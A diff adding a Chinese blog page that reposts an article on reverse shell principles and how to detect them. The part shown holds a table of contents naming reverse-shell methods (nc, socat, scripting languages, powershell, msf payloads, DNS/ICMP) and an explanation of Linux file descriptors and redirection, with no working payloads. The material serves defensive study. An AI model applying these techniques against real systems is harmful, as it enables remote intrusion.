@@ -1,0 +1,1084 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme="auto">
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/%E5%AD%A6%E6%A0%A1.png">
+  <link rel="icon" href="/img/%E5%AD%A6%E6%A0%A1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lp">
+  <meta name="keywords" content>
+  
+    <meta name="description" content="本篇文章主要介绍反弹Shell原理以及常见检测技术">
+<meta property="og:type" content="article">
+<meta property="og:title" content="入侵检测——反弹Shell原理以及常见检测技术">
+<meta property="og:url" content="https://blog.longpi1.com/2023/02/04/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E2%80%94%E2%80%94%E5%8F%8D%E5%BC%B9Shell%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF/index.html">
+<meta property="og:site_name" content="lp&#39;s blog">
+<meta property="og:description" content="本篇文章主要介绍反弹Shell原理以及常见检测技术">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215220831022-201658057.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214103946845-1739367665.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110352181-1114204290.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110751434-1161244658.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110913956-79867805.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111019277-654958095.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111747902-1023189028.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111821295-137624665.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113225130-460473756.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113307927-498723848.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113402709-148725631.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214114049434-1826483874.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214114254852-1959897938.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215091731268-1852930532.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215093600154-402836042.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215201848293-652984613.png">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104646111-1137243959.png">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104034125-1531808234.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104112969-1097291178.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215105358151-246000034.png">
+<meta property="article:published_time" content="2023-02-04T05:38:46.000Z">
+<meta property="article:modified_time" content="2023-02-04T05:41:39.367Z">
+<meta property="article:author" content="lp">
+<meta property="article:tag" content="转载">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="容器">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215220831022-201658057.png">
+  
+  
+  
+  <title>入侵检测——反弹Shell原理以及常见检测技术 - lp&#39;s blog</title>
+
+  <link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css">
+
+
+
+  <link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css">
+
+  <link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css">
+
+  <link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css">
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css">
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.longpi1.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":30,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"UvaCwj6C0pVj9XCWuMtLaBWJ-gzGzoHsz","app_key":"w2xUk9wycItSqrREmRMDYJHY","server_url":"https://uvacwj6c.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lp&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                文章分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于我
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax="true" style="background: url('/img/bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="入侵检测——反弹Shell原理以及常见检测技术"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-02-04 13:38" pubdate>
+          2023年2月4日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k 字
+        
+      </span>
+    
+
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+
+    <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/longpi1"><img loading="lazy" width="149" height="149" src="https://github.blog/wp-content/uploads/2008/12/forkme_left_darkblue_121621.png?resize=149%2C149" srcset="/img/loading.gif" lazyload class="attachment-full size-full" alt="follow me on GitHub" data-recalc-dims="1"></a>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">入侵检测——反弹Shell原理以及常见检测技术</h1>
+            
+            
+              <div class="markdown-body">
+              <meta name="referrer" content="no-referrer">
+                
+                <h1 id="入侵检测——反弹Shell原理以及常见检测技术"><a href="#入侵检测——反弹Shell原理以及常见检测技术" class="headerlink" title="入侵检测——反弹Shell原理以及常见检测技术"></a>入侵检测——反弹Shell原理以及常见检测技术</h1><blockquote>
+<p>主要内容转载自  <a target="_blank" rel="external nofollow noopener noreferrer" href="https://home.cnblogs.com/u/LittleHann/">郑瀚Andrew</a>的 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html">反弹Shell原理及检测技术研究</a></p>
+</blockquote>
+<p><strong>目录(Content)</strong></p>
+<ul>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label0">1. 反弹Shell的概念本质</a></p>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label1">2. 网络通信（network api）方式讨论</a></p>
+</li>
+<li><ul>
+<li><p>[0x1：&#x2F;dev&#x2F;<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_0">tcp|udp]【4层协议】</a></p>
+</li>
+<li><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_1_0_0">1. 从文件描述（file descriptor）符说起</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_1_0_1">2. 重定向</a></li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_1">0x2：通过建立socket tcp连接实现网络通信【4层协议】 </a></p>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_2">0x3：使用ICMP实现网络通信【4层协议】</a></p>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_3">0x4：使用DNS实现网络通信【7层协议】</a></p>
+</li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label2">3. 命令执行（system executor）方式讨论</a></p>
+</li>
+<li><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_2_0">0x1：通过管道符传递指令</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_2_1">0x2：通过调用glibc api执行系统指令</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_2_2">0x3：通过直接调用系统调用执行指令</a></li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3">4. 反弹Shell攻击组合方式讨论</a></p>
+</li>
+<li><ul>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_0">0x1：“重定向符”+”&#x2F;dev&#x2F;tcp网络通信”Bash反弹Shell</a></p>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_1">0x2：第三方软件内置“socket通信”+“指令交互”实现反弹shel功能</a></p>
+</li>
+<li><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_1_0">1. nc</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_1_1">2. telnet反弹shell</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_1_2">3. socat反弹shell</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_1_3">4. Xterm </a></li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_2">0x3：“管道符”+ “socket网络通信”实现bash反弹shell</a></p>
+</li>
+<li><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_2_0">1. 基于匿名管道（pipe）传递指令流</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_2_1">2. 基于命名管道（fifo）</a></li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_3">0x4：git解释性脚本语言反弹shell</a></p>
+</li>
+<li><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_0">1. python反弹shell</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_1">2. perl反弹shell </a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_2">3. ruby反弹shell</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_3">4. go反弹shell</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_4">6. lua反弹shell</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_5">7. java</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_6">8. gawk</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_7">9. powershell反弹shell</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_8">10. regsvr32反弹shell</a></li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_4">0x5：msf生成payload反弹shell</a></p>
+</li>
+<li><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_4_0">1. 生成脚本解释型代码并执行</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_4_1">2. 生成编译型二进制文件并执行</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_4_2">3. 内存shellcode执行</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_4_3">4. 通过dll进程注入执行反弹shell</a></li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_5">0x6：dns_shell &amp; icmp_shell</a></p>
+</li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label4">5. 反弹Shell检测思路</a></p>
+</li>
+<li><ul>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_0">0x1：进程 file descriptor 异常检测</a></p>
+</li>
+<li><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_4_0_0">1. 检测 file descriptor 是否指向一个socket</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_4_0_1">1. 检测 file descriptor 是否指向一个管道符（pipe）</a></li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_1">0x3：netlink监控+fd异常检测</a></p>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_2">0x4：脚本文件 &amp;&amp; 应用程序 &amp;&amp; 无文件（fileless）反弹shell检测</a></p>
+</li>
+<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_3">0x5：网络层反弹shell通信特征检测</a></p>
+</li>
+</ul>
+</li>
+</ul>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop">回到顶部(go to top)</a></p>
+<h1 id="1-反弹Shell的概念本质"><a href="#1-反弹Shell的概念本质" class="headerlink" title="1. 反弹Shell的概念本质"></a>1. 反弹Shell的概念本质</h1><p>所谓的反弹shell（reverse shell），就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。 </p>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215220831022-201658057.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>本文会先分别讨论：</p>
+<ul>
+<li>命令执行（system executor）</li>
+<li>网络通信（network api）</li>
+</ul>
+<p>这两个基础原子概念，然后在之后的章节中用组合的方式来呈现现在主流的反弹shell技术方式及其原理，用这种横向和纵向拆分的方式来帮助读者朋友更好地理解反弹shell。</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop">回到顶部(go to top)</a></p>
+<h1 id="2-网络通信（network-api）方式讨论"><a href="#2-网络通信（network-api）方式讨论" class="headerlink" title="2. 网络通信（network api）方式讨论"></a>2. 网络通信（network api）方式讨论</h1><h2 id="0x1：-x2F-dev-x2F-tcp-udp-【4层协议】"><a href="#0x1：-x2F-dev-x2F-tcp-udp-【4层协议】" class="headerlink" title="0x1：&#x2F;dev&#x2F;[tcp|udp]【4层协议】"></a>0x1：&#x2F;dev&#x2F;[tcp|udp]【4层协议】</h2><h3 id="1-从文件描述（file-descriptor）符说起"><a href="#1-从文件描述（file-descriptor）符说起" class="headerlink" title="1. 从文件描述（file descriptor）符说起"></a>1. 从文件描述（file descriptor）符说起</h3><p>linux文件描述符可以理解为<strong>linux跟踪打开文件而分配的一个数字句柄</strong>，这个数字本质上是一个文件句柄，通过句柄就可以实现文件的读写操作。</p>
+<p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
+<ul>
+<li>标准输入：standard input 0 （默认设备键盘）</li>
+<li>标准输出：standard output 1（默认设备显示器）</li>
+<li>错误输出：error output 2（默认设备显示器）</li>
+</ul>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214103946845-1739367665.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>进程启动后再打开新的文件，描述符会自动依次增加。每一个新进程都会继承其父进程的文件描述符，因此所有的shell命令（本质上也是启动新进程），都会默认有三个文件描述符。</p>
+<p><strong>Linux一切皆文件</strong>，键盘、显示器设备也是文件，因此他们的输入输出也是由文件描述符控制。如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
+<h3 id="2-重定向"><a href="#2-重定向" class="headerlink" title="2. 重定向"></a>2. 重定向</h3><p>重定向主要分为两种</p>
+<ul>
+<li>输入重定向<ul>
+<li>“&lt;”</li>
+<li>“&lt;&lt;”</li>
+</ul>
+</li>
+<li>输出重定向<ul>
+<li>“&gt;”</li>
+<li>“&gt;&gt;”</li>
+</ul>
+</li>
+</ul>
+<p>bash在执行一条指令的时候，首先会检查命令中是否存在文件描述符重定向的符号，如果存在那么<strong>首先将文件描述符重定向（预处理）</strong>，然后在把重定向去掉，继续执行指令。如果指令中存在多个重定向，重定向<strong>从左向右解析</strong>。</p>
+<h4 id="1）输入重定向"><a href="#1）输入重定向" class="headerlink" title="1）输入重定向"></a>1）输入重定向</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[n]</span>&lt; word <br>（注意<span class="hljs-selector-attr">[n]</span>与&lt;之间没有空格）<br></code></pre></td></tr></table></figure>
+
+<p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）。</p>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110352181-1114204290.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。</p>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110751434-1161244658.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="2）输出重定向"><a href="#2）输出重定向" class="headerlink" title="2）输出重定向"></a>2）输出重定向</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[n]</span>&gt; word<br></code></pre></td></tr></table></figure>
+
+<p>说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）。</p>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110913956-79867805.png" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>上述指令将文件描述符1（标准输出）重定向到了指定文件。</p>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111019277-654958095.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="3）标准输出与标准错误输出重定向"><a href="#3）标准输出与标准错误输出重定向" class="headerlink" title="3）标准输出与标准错误输出重定向"></a>3）标准输出与标准错误输出重定向</h4><p>下面3种形式完全等价，</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">&amp;&gt; word </span><br>&gt;<span class="hljs-meta">&amp; word</span><br>&gt; word <span class="hljs-number">2</span>&gt;<span class="hljs-meta">&amp;1：将标准错误输出复制到标准输出</span><br></code></pre></td></tr></table></figure>
+
+<p>说明：将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开）。</p>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111747902-1023189028.png" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。</p>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111821295-137624665.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="4）文件描述符的复制"><a href="#4）文件描述符的复制" class="headerlink" title="4）文件描述符的复制"></a>4）文件描述符的复制</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[n]</span>&lt;&amp;<span class="hljs-selector-attr">[m]</span> <br>n]&gt;&amp;<span class="hljs-selector-attr">[m]</span> <br>注意：这里所有字符之间不要有空格<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>这两个指令都是将文件描述符 n 复制到 m ，两者的区别是<ul>
+<li>[n]&lt;&amp;[m] ：以只读的形式打开</li>
+<li>n]&gt;&amp;[m] ：以写的形式打开</li>
+</ul>
+</li>
+<li>这里的 &amp; 目的是为了区分数字名字的文件和文件描述符，如果没有 &amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</li>
+</ul>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113225130-460473756.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>注意，重定向符号的顺序不能随便换，因为系统是从左到右执行。我们来分析上面指令结果出现的原理，</p>
+<p><strong>首先解析器解析到 2&gt;&amp;1</strong></p>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113307927-498723848.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>解析器再向后解析到 “&gt;”</strong> </p>
+<p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113402709-148725631.png" srcset="/img/loading.gif" lazyload alt="img"></p>
